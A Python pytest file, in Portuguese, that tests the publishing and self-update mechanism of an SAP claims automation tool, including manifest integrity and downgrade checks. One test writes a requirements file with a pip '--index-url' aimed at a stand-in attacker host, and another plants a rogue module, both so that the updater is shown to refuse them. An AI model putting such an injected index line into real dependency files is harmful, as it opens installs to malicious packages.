# Automação de Claims SAP — © 2026 Elder Tiago Priciliano Ruas. Todos os direitos reservados.
# Uso, cópia, modificação ou distribuição somente com autorização por escrito do autor. Ver LICENSE.
"""Publicação no servidor e atualização automática nos computadores."""

import importlib.util
import shutil
from pathlib import Path

import pytest

RAIZ = Path(__file__).resolve().parent.parent


def _modulo(nome, caminho):
    spec = importlib.util.spec_from_file_location(nome, caminho)
    modulo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(modulo)
    return modulo


publicar = _modulo("publicar_mod", RAIZ / "publicar.py")
iniciar = _modulo("iniciar_mod", RAIZ / "distribuicao" / "iniciar.py")


@pytest.fixture
def servidor(tmp_path):
    pasta = tmp_path / "servidor"
    pasta.mkdir()
    return pasta


@pytest.fixture
def pc(tmp_path):
    pasta = tmp_path / "pc"
    pasta.mkdir()
    return pasta


def _sem_pip(_requirements):
    pass


# ------------------------------------------------------------------ publicação

def test_proxima_versao():
    assert publicar.proxima_versao("1.0.0") == "1.0.1"
    assert publicar.proxima_versao("1.2.9") == "1.2.10"
    assert publicar.proxima_versao("") == "1.0.0"


def test_settings_de_producao():
    from conftest import texto_settings_padrao
    texto = texto_settings_padrao().replace("pasta_dados =", r"pasta_dados = C:\dev\historico")
    prod = publicar.settings_de_producao(texto)
    assert "modo = AUTOMATICO" in prod and "automatico_habilitado = sim" in prod
    assert "\npasta_dados =\n" in prod                       # histórico na pasta padrão de cada usuário
    assert "USUARIO_SUP" in prod and "40SUPRIMENTOS" in prod     # rotas preservadas


def test_pacote_de_producao_sem_testes_nem_simulador(tmp_path):
    destino = tmp_path / "app"
    publicar.montar_pacote(RAIZ, destino, "1.0.0")
    nomes = {p.name for p in destino.rglob("*")}
    assert {"ui.py", "sap_client.py", "iniciar.py", "settings.ini", "versao.txt", "app.ico"} <= nomes
    assert not {"sap_fake.py", "ensaio.py", "publicar.py", "conftest.py"} & nomes
    assert "pytest" not in (destino / "requirements.txt").read_text()


def test_pacote_publicado_carrega_em_modo_de_uso(tmp_path):
    from config import load_settings
    destino = tmp_path / "app"
    publicar.montar_pacote(RAIZ, destino, "1.0.0")
    s = load_settings(destino / "settings.ini")
    assert (s.modo, s.automatico_habilitado) == ("AUTOMATICO", True)


def test_publicar_e_republicar(servidor):
    assert publicar.publicar(servidor, nota="primeira") == "1.0.0"
    assert publicar.publicar(servidor, nota="segunda") == "1.0.1"
    assert (servidor / "app" / "versao.txt").read_text().strip() == "1.0.1"
    assert (servidor / "app_anterior" / "versao.txt").read_text().strip() == "1.0.0"
    assert (servidor / "instalar.bat").exists() and (servidor / "instalar.py").exists()
    assert len((servidor / "historico_versoes.txt").read_text(encoding="utf-8").splitlines()) == 2
    assert not (servidor / "app_publicando").exists()


def test_nao_republica_a_mesma_versao(servidor):
    publicar.publicar(servidor, versao="2.0.0")
    with pytest.raises(ValueError):
        publicar.publicar(servidor, versao="2.0.0")


# ------------------------------------------------------------------ atualização no computador

def test_primeira_instalacao_e_atualizacao(servidor, pc):
    publicar.publicar(servidor)
    assert "atualizado" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "1.0.0"
    assert (pc / "iniciar.py").exists()

    assert "já é a do servidor" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)

    publicar.publicar(servidor)
    assert "para 1.0.1" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "1.0.1"
    assert not (pc / "app_novo").exists()


def test_servidor_fora_do_ar_usa_versao_instalada(servidor, pc):
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    shutil.rmtree(servidor)
    assert "inacessível" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "1.0.0"


def test_falha_no_pip_mantem_a_versao_anterior(servidor, pc):
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    publicar.publicar(servidor)
    (servidor / "app" / "requirements.txt").write_text("biblioteca-nova\n")
    publicar.escrever_manifesto(servidor / "app", iniciar.ler_versao(servidor / "app"))  # publicação legítima

    def pip_quebrado(_):
        raise RuntimeError("sem internet")
    with pytest.raises(RuntimeError):
        iniciar.atualizar(servidor / "app", pc, instalar_libs=pip_quebrado, libs_presentes=lambda: False)
    assert iniciar.ler_versao(pc / "app") == "1.0.0"       # continua funcionando
    assert not (pc / "app_novo").exists()


def test_pip_sem_internet_com_python_embutido_segue(servidor, pc):
    publicar.publicar(servidor)

    def pip_sem_internet(_):
        raise RuntimeError("sem conexão")
    resultado = iniciar.atualizar(servidor / "app", pc, instalar_libs=pip_sem_internet, libs_presentes=lambda: True)
    assert "atualizado" in resultado and iniciar.ler_versao(pc / "app") == "1.0.0"


# ------------------------------------------------------------------ Python embutido

def _runtime_falso(pasta, com=("customtkinter", "win32com", "win32"), tkinter=True):
    pasta.mkdir()
    for exe in ("python.exe", "pythonw.exe"):
        (pasta / exe).write_bytes(b"MZ")
    if tkinter:
        (pasta / "Lib" / "tkinter").mkdir(parents=True)
    for nome in com:
        (pasta / "Lib" / "site-packages" / nome).mkdir(parents=True, exist_ok=True)
    (pasta / "Lib" / "site-packages" / "pytest").mkdir(parents=True, exist_ok=True)
    return pasta


def test_publica_o_python_embutido(servidor, tmp_path):
    runtime = _runtime_falso(tmp_path / "python315")
    publicar.publicar_runtime(servidor, runtime)
    assert (servidor / "python" / "pythonw.exe").exists()
    assert (servidor / "python" / "Lib" / "site-packages" / "customtkinter").exists()
    assert not (servidor / "python" / "Lib" / "site-packages" / "pytest").exists()   # só o necessário
    assert (servidor / "python" / "runtime.txt").exists()
    publicar.publicar_runtime(servidor, runtime)                                      # republicar troca
    assert (servidor / "python_anterior").exists() and not (servidor / "python_publicando").exists()


@pytest.mark.parametrize("problema,kwargs", [
    ("tkinter", {"tkinter": False}),
    ("customtkinter", {"com": ("win32com", "win32")}),
    ("win32com", {"com": ("customtkinter", "win32")}),
])
def test_recusa_python_incompleto(servidor, tmp_path, problema, kwargs):
    runtime = _runtime_falso(tmp_path / "python", **kwargs)
    with pytest.raises(ValueError, match=problema):
        publicar.publicar_runtime(servidor, runtime)
    assert not (servidor / "python").exists()


def test_requirements_igual_nao_roda_pip(servidor, pc):
    chamadas = []
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=chamadas.append)
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=chamadas.append)
    assert len(chamadas) == 1                               # só na primeira instalação


def test_sem_origem_configurada(pc):
    assert iniciar.atualizar(None, pc) == "sem origem configurada"


def test_ler_origem(tmp_path):
    ini = tmp_path / "atualizacao.ini"
    ini.write_text("[atualizacao]\norigem = \\\\servidor\\comercial\\AutomacaoClaims\\app\n", encoding="utf-8")
    assert str(iniciar.ler_origem(ini)).endswith("AutomacaoClaims\\app") or \
        "AutomacaoClaims" in str(iniciar.ler_origem(ini))
    assert iniciar.ler_origem(tmp_path / "nao_existe.ini") is None


def test_todo_modulo_importado_vai_para_a_producao():
    """Um módulo novo esquecido em ARQUIVOS_DO_PROGRAMA quebraria o programa dos orçamentistas."""
    import ast
    locais = {p.stem for p in RAIZ.glob("*.py")}
    enviados = {n[:-3] for n in publicar.ARQUIVOS_DO_PROGRAMA if n.endswith(".py")}
    so_dev = {"sap_fake", "ensaio", "publicar"}      # importados só em simulação/desenvolvimento
    faltando = set()
    for nome in enviados:
        arvore = ast.parse((RAIZ / f"{nome}.py").read_text(encoding="utf-8"))
        for no in ast.walk(arvore):
            modulos = [a.name for a in no.names] if isinstance(no, ast.Import) else \
                      [no.module] if isinstance(no, ast.ImportFrom) and no.module else []
            faltando |= {m.split(".")[0] for m in modulos if m.split(".")[0] in locais} - enviados - so_dev
    assert not faltando, f"Módulos usados mas não publicados: {sorted(faltando)}"


# ------------------------------------------------------------------ integridade (revisão da banca, 27/10/2026)

def test_pacote_tem_manifesto_com_todos_os_arquivos(tmp_path):
    import json
    destino = tmp_path / "app"
    publicar.montar_pacote(RAIZ, destino, "1.0.0")
    manifesto = json.loads((destino / "manifesto.json").read_text(encoding="utf-8"))
    assert manifesto["versao"] == "1.0.0" and "ui.py" in manifesto["arquivos"]
    assert iniciar.conferir_manifesto(destino, "1.0.0") == ""


def test_arquivo_estranho_no_servidor_recusa_a_atualizacao(servidor, pc):
    publicar.publicar(servidor)
    (servidor / "app" / "win32com.py").write_text("import os  # plantado\n")
    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert not (pc / "app").exists() and not (pc / "app_novo").exists()


def test_arquivo_alterado_no_servidor_recusa_e_mantem_a_versao(servidor, pc):
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    publicar.publicar(servidor)
    with open(servidor / "app" / "ui.py", "a", encoding="utf-8") as f:
        f.write("\n# alterado depois de publicar\n")
    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "1.0.0"


def test_versao_mais_antiga_no_servidor_e_ignorada(servidor, pc):
    publicar.publicar(servidor, versao="2.0.0")
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    (servidor / "app" / "versao.txt").write_text("1.9.0\n")
    assert "mais antiga" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "2.0.0"


def test_depois_do_manifesto_versao_sem_manifesto_e_recusada(servidor, pc):
    publicar.publicar(servidor)
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    publicar.publicar(servidor)
    (servidor / "app" / "manifesto.json").unlink()
    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)


def test_publicar_recusa_pasta_que_nao_e_da_publicacao(tmp_path):
    # Revisão de 27/10/2026: caminho digitado errado não pode ter subpastas apagadas/renomeadas.
    grupo = tmp_path / "grupo"
    (grupo / "app").mkdir(parents=True)
    (grupo / "app" / "planilha.xlsx").write_text("dados do grupo")
    with pytest.raises(ValueError, match="não é a pasta de publicação"):
        publicar.publicar(grupo)
    assert (grupo / "app" / "planilha.xlsx").exists() and not (grupo / "app_anterior").exists()


def test_primeira_publicacao_deixa_o_marcador(servidor):
    publicar.publicar(servidor)
    assert (servidor / publicar.MARCADOR).exists()
    publicar.publicar(servidor)                         # a segunda reconhece a pasta


# ------------------------------------------------------------------ 2ª banca (27/10/2026)

def test_thumbs_db_do_explorer_nao_trava_a_atualizacao(servidor, pc):
    publicar.publicar(servidor)
    (servidor / "app" / "assets").mkdir(exist_ok=True)
    (servidor / "app" / "assets" / "Thumbs.db").write_bytes(b"x")
    (servidor / "app" / "desktop.ini").write_text("[.ShellClassInfo]")
    assert "atualizado" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert not (pc / "app" / "desktop.ini").exists()            # não é copiado


def test_requirements_com_opcao_do_pip_e_recusado(servidor, pc):
    publicar.publicar(servidor)
    (servidor / "app" / "requirements.txt").write_text("--index-url http://atacante/simple\npywin32==312\n")
    publicar.escrever_manifesto(servidor / "app", iniciar.ler_versao(servidor / "app"))   # manifesto refeito
    chamadas = []
    assert "recusada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=chamadas.append)
    assert chamadas == [] and not (pc / "app").exists()


def test_versao_nao_numerica_no_servidor_e_ignorada(servidor, pc):
    publicar.publicar(servidor, versao="2.0.0")
    iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    (servidor / "app" / "versao.txt").write_text("1.0.1-hotfix\n")
    assert "ignorada" in iniciar.atualizar(servidor / "app", pc, instalar_libs=_sem_pip)
    assert iniciar.ler_versao(pc / "app") == "2.0.0"
